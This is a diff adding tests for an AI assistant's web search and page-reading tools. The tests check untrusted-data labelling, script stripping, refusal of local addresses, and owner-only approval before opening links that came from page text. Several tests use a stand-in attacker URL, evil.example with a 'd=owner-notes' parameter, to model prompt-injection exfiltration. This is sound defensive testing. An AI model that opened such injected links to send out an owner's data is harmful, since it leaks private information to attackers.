@@ -1,7 +1,9 @@
 import assert from "node:assert/strict";
 import { afterEach, beforeEach, describe, it } from "node:test";
+import { askText } from "../src/approval.ts";
 import { ASK_TEXT } from "../src/location.ts";
 import { PLACES_HOST, PLACES_URL } from "../src/places.ts";
+import { SEARCH_URL } from "../src/web.ts";
 import { REMINDER_PREFIX } from "../src/reminders.ts";
 import { STOPPED_TEXT } from "../src/app.ts";
 import { call, flatten, inbound, say } from "./helpers.ts";
@@ -254,5 +256,149 @@ describe("location and nearby places", () => {
     await rig.channel.sentCount(1);
     assert.match(flatten(rig.model.requests.at(-1) as never), /places lookup failed/i);
     assert.ok(rig.logs.some((entry) => entry.event === "places_failed"));
+  });
+});
+
+describe("web search and reading", () => {
+  let rig: Rig;
+  beforeEach(async () => {
+    rig = new Rig();
+    await rig.open();
+  });
+  afterEach(() => rig.close());
+
+  const PAGE =
+    "<!doctype html><html><head><title>Kombucha</title></head><body><nav>Home About</nav>" +
+    `<article><p>${"Kombucha is a fermented tea. ".repeat(20)}</p></article><script>alert(1)</script></body></html>`;
+
+  const web = (seen: Seen[], pageStatus = 200, searchStatus = 200) => async (url: string, init: Seen["init"]) => {
+    seen.push({ url, init });
+    if (url === SEARCH_URL) {
+      const results = [{ title: "Kombucha", url: "https://tea.test/kombucha", text: "A fermented tea.", publishedDate: "2026-10-01T00:00:00.000Z" }];
+      return new Response(JSON.stringify({ results }), { status: searchStatus, headers: { "content-type": "application/json" } });
+    }
+    return new Response(PAGE, { status: pageStatus, headers: { "content-type": "text/html; charset=utf-8" } });
+  };
+
+  it("searches the web, then reads a result in full, on the two public hosts", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "kombucha" }), call("web_read", { url: "https://tea.test/kombucha" }), say("It is a fermented tea."));
+    await rig.boot({ fetch: web(seen), searchApiKey: "exa-key" });
+    rig.channel.push(inbound("m1", "what is kombucha"));
+    await rig.channel.sentCount(1);
+    const found = flatten(rig.model.requests[1] as never);
+    assert.match(found, /1 result\(s\) for \\"kombucha\\"/);
+    assert.match(found, /Kombucha \(2026-10-01\)\\nhttps:\/\/tea\.test\/kombucha/);
+    assert.match(found, /untrusted data/);
+    const read = flatten(rig.model.requests.at(-1) as never);
+    assert.match(read, /Kombucha is a fermented tea/);
+    assert.doesNotMatch(read, /Home About|alert/);
+    assert.deepEqual(rig.texts(), ["It is a fermented tea."]);
+    assert.equal(seen.length, 2);
+    assert.equal(new URL(seen[0]?.url ?? "").host, new URL(SEARCH_URL).host);
+    assert.equal(seen[0]?.init.headers["x-api-key"], "exa-key");
+    assert.equal(seen[0]?.init.redirect, "error");
+    assert.equal(seen[1]?.init.redirect, "follow");
+  });
+
+  it("reports a failed search to the model and logs why", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "tea" }), say("Search failed."));
+    await rig.boot({ fetch: web(seen, 200, 500), searchApiKey: "exa-key" });
+    rig.channel.push(inbound("m1", "look it up"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests[1] as never), /web search failed/i);
+    assert.ok(rig.logs.some((entry) => entry.event === "web_search_failed" && entry.fields.error === "Error"));
+    assert.equal(seen.length, 1);
+  });
+
+  it("says search is not set up when no key is configured, without calling out", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "tea" }), say("I cannot search yet."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "look it up"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests[1] as never), /TETHER_SEARCH_API_KEY is missing/);
+    assert.equal(seen.length, 0);
+  });
+
+  it("refuses a link that is not public and reports a page it cannot read", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: "http://127.0.0.1:4000/health/readiness" }), call("web_read", { url: "https://tea.test/gone" }), say("No luck."));
+    await rig.boot({ fetch: web(seen, 404) });
+    rig.channel.push(inbound("m1", "read https://tea.test/gone"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests[1] as never), /not a public web link/);
+    assert.match(flatten(rig.model.requests.at(-1) as never), /could not be read/);
+    assert.deepEqual(
+      seen.map((entry) => entry.url),
+      ["https://tea.test/gone"],
+    );
+    assert.ok(rig.logs.some((entry) => entry.event === "web_read_failed"));
+  });
+
+  it("reads a link from the owner's text without asking", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: "https://tea.test/kombucha" }), say("Read it."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "what does https://tea.test/kombucha say?"));
+    await rig.channel.sentCount(1);
+    assert.deepEqual(rig.texts(), ["Read it."]);
+    assert.equal(seen.length, 1);
+  });
+
+  const LEAK = "https://evil.example/?d=owner-notes";
+
+  it("asks first for a link that came only from page text, and a NO fetches nothing", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: LEAK }), say("Okay, I did not open it."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "summarise my inbox"));
+    await rig.channel.sentCount(1);
+    assert.equal(rig.texts()[0], askText(`Open this link? It did not come from you or a search: ${LEAK}`));
+    assert.equal(seen.length, 0);
+    rig.channel.push(inbound("m2", "NO"));
+    await rig.channel.sentCount(2);
+    assert.equal(rig.texts()[1], "Okay, I did not open it.");
+    assert.equal(seen.length, 0);
+  });
+
+  it("fetches the asked link only after YES, and a YES from another sender fetches nothing", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: LEAK }), say("Opened it."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "summarise my inbox"));
+    await rig.channel.sentCount(1);
+    rig.channel.push(inbound("m2", "YES", { sender: "stranger@example.test" }));
+    await new Promise((resolve) => setTimeout(resolve, 200));
+    assert.equal(seen.length, 0);
+    rig.channel.push(inbound("m3", "YES"));
+    await rig.channel.sentCount(2);
+    assert.deepEqual(seen.map((entry) => entry.url), [LEAK]);
+  });
+
+  it("shows the whole link in the ask, and a stranger's text never allows one", opts, async () => {
+    const seen: Seen[] = [];
+    const long = `https://evil.example/?d=${"x".repeat(1900)}`;
+    rig.model.enqueue(call("web_read", { url: long }), say("Not opened."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m0", `read ${long}`, { sender: "stranger@example.test" }));
+    rig.channel.push(inbound("m1", "read my mail"));
+    await rig.channel.sentCount(1);
+    assert.ok(rig.texts()[0]?.includes(long));
+    assert.ok((rig.texts()[0]?.length ?? 0) > 1900);
+    assert.equal(seen.length, 0);
+  });
+
+  it("does not carry a search result into the next task", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "kombucha" }), say("Found it."), call("web_read", { url: "https://tea.test/kombucha" }), say("Not opened."));
+    await rig.boot({ fetch: web(seen), searchApiKey: "exa-key" });
+    rig.channel.push(inbound("m1", "search kombucha"));
+    await rig.channel.sentCount(1);
+    rig.channel.push(inbound("m2", "now read the first one"));
+    await rig.channel.sentCount(2);
+    assert.match(rig.texts()[1] ?? "", /Allow this\? Open this link\? .*https:\/\/tea\.test\/kombucha/);
+    assert.equal(seen.length, 1);
   });
 });
